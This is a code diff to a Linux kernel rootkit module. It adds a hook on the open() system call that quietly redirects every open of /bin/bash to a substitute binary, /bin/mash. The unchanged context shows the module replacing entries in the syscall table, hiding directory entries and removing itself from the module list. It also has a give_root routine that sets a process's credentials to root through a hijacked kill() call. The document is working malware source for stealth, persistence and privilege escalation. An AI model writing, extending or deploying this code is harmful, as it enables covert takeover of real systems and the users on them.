@@ -7,6 +7,7 @@
 #include <linux/fdtable.h>
 #include <asm/uaccess.h>
 #include <linux/proc_ns.h>
+#include <linux/fs.h>
 #include "RootKit.h"
 
 unsigned long cr0;
@@ -16,9 +17,17 @@ typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
 	struct linux_dirent64 *, unsigned int);
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+typedef asmlinkage int (*orig_open_t)(const char*,int,mode_t);
+typedef asmlinkage int (*orig_close_t)(int);
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
+orig_open_t orig_open;
+
+
+#define FILE_FROM "/bin/bash"
+//#define FILE_TO "/bin/bash"
+#define FILE_TO "/bin/mash"
 
 //function to get the address of the system call table
 unsigned long *
@@ -163,17 +172,17 @@ out:
 void
 give_root(void)
 {
-	
+
 		struct cred *newcreds;
 		newcreds = prepare_creds();
 		if (newcreds == NULL)
-			return;	
+			return;
 		newcreds->uid.val = newcreds->gid.val = 0;
 		newcreds->euid.val = newcreds->egid.val = 0;
 		newcreds->suid.val = newcreds->sgid.val = 0;
 		newcreds->fsuid.val = newcreds->fsgid.val = 0;
 		commit_creds(newcreds);
-	
+
 }
 
 static inline void
@@ -199,7 +208,44 @@ module_hide(void)
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
-// the hacked kill function which performs the normal kill operation besides our commands. 
+
+asmlinkage int
+hacked_open(const char *path,int flags,mode_t mode){
+  char buff[sizeof(FILE_TO)];
+	struct file *bash_path, *filep;
+	int ret,redir;
+
+	ret = orig_open(path,flags,mode);
+
+	if(ret < 0){
+		return ret;
+	}
+
+	bash_path = filp_open(FILE_FROM,O_PATH,0);
+	if(!bash_path){
+			printk("RootKit open error");
+			return ret;
+	}
+
+	redir = path_equal(&(bash_path->f_path),&(current->files->fdt->fd[ret]->f_path));
+	filp_close(bash_path,NULL);
+
+	//printk("redir = %d\n",redir);
+	if(redir){
+		((orig_close_t)__sys_call_table[__NR_close])(ret);
+
+		copy_from_user(buff,path,sizeof(FILE_TO));
+		copy_to_user(path,FILE_TO,sizeof(FILE_TO));
+		ret = orig_open(path,flags,mode);
+		copy_to_user(path,buff,sizeof(FILE_TO));
+
+		printk("Reopen %d\n",ret);
+	}
+	//printk("Result:%d\n",redir);
+	return ret;
+}
+
+// the hacked kill function which performs the normal kill operation besides our commands.
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
@@ -249,15 +295,19 @@ RootKit_init(void)
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+	orig_open = (orig_open_t)__sys_call_table[__NR_open];
 
 	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+	__sys_call_table[__NR_open] = (unsigned long)hacked_open;
 	protect_memory();
 
 	return 0;
 }
+
+
 
 static void __exit
 RootKit_cleanup(void)
@@ -266,6 +316,7 @@ RootKit_cleanup(void)
 	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+	__sys_call_table[__NR_open] = (unsigned long)orig_open;
 	protect_memory();
 }
 
